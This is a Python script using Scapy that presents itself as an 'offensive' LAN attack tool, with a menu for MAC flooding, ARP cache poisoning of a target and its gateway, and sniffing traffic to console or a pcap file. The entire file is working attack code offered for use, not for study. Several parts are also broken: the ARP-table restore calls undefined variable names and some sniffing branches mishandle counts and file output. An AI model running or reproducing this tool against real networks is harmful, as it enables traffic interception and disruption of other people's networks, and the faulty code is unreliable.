from scapy.all import *
import pyfiglet
result = pyfiglet.figlet_format("INTRA TAC")
print(result)

def mac_flood():
    while 1:
        sendp(Ether(src=RandMAC(), dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc="0.0.0.0",hwdst="FF:FF:FF:FF:FF:FF") / Padding(load="X" * 18))


def fetchmac(target_ip):

    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
    target_mac = srp(arp_packet, timeout=2 , verbose= False)[0][0][1].hwsrc
    return target_mac


def arpcachespoofing(target_ip, target_mac, source_ip):

    spoof_packet= ARP(op=2 , pdst=target_ip, psrc=source_ip, hwdst= target_mac)
    send(spoof_packet, verbose= False)


def restoringarptable(target_ip, target_mac, source_ip, source_mac):

    packet= ARP(op=2 , hwsrc=source_mac , psrc= source_ip, hwdst= target_mac , pdst= target_ip)
    send(packet, verbose=False)
    print ("ARP Table restored to normal for", targetip)


def exc():
    target_ip = input("Enter Target IP:")
    gateway_ip = input("Enter Gateway IP:")

    try:
        target_mac = fetchmac(target_ip)
        print("Target MAC", target_mac)

    except:

        print("Target machine did not respond to ARP broadcast")
        quit()

    try:
        gateway_mac = fetchmac(gateway_ip)
        print ("Gateway MAC:", gateway_mac)


    except:

        print("Gateway is unreachable")
        quit()

    try:

        print("Sending spoofed ARP responses")
        while True:
            arpcachespoofing(target_ip, target_mac, gateway_ip)
            arpcachespoofing(gateway_ip, gateway_mac, target_ip)

    except KeyboardInterrupt:

        print("ARP spoofing stopped")
        restoringarptable(gatewayip, gatewaymac, targetip, targetmac)
        restoringarptable(targetip, targetmac, gatewayip, gatewaymac)
        quit()

def sniffer():


    ifc = input("interface to sniff: ")
    cn = input("number of packets to sniff, if until ^c enter 'C': ")
    inp = input("Enter 'c' for console output, 'f' for pcap file output: ")
    if inp == 'c' and cn.isnumeric():
        sniff(prn=lambda x: x.summary(), count=cn)

    if inp == 'c' and cn == 'c':
        try:
            sniff(prn=lambda x: x.summary())
        except KeyboardInterrupt:
            print("Stopping...Keyboard interrupt detected..")

    if inp == 'f' and cn == 'c':
        file = input("Enter the name for pcap file: ")
        fl = file + ".pcap"
        try:
            dta = sniff(iface=ifc)
        except Exception as e:
            print(e)
        except KeyboardInterrupt:
            wrpcap(fl, dta)

    if inp == 'f' and cn.isnumeric():
        file = input("Enter the name for pcap file: ")
        fl = file + ".pcap"
        try:
            dta = sniff(iface=ifc, count=cn)
        except Exception as e:
            print(e)



print("attacks available: ")
print("1.) MAC flooding \n2.) ARP poisoning \n3.) Sniffing network traffic")

a = input("choose an offensive option: ")
if a=='1':
    try:
        print("Flooding started.. Press ctr+c to interup/stop")
        mac_flood()

    except KeyboardInterrupt:
        print("keyboard interrupt detected..")
        print("Flooding stopped....")

if a =='2':

    exc()
if a =='3':
    sniffer()



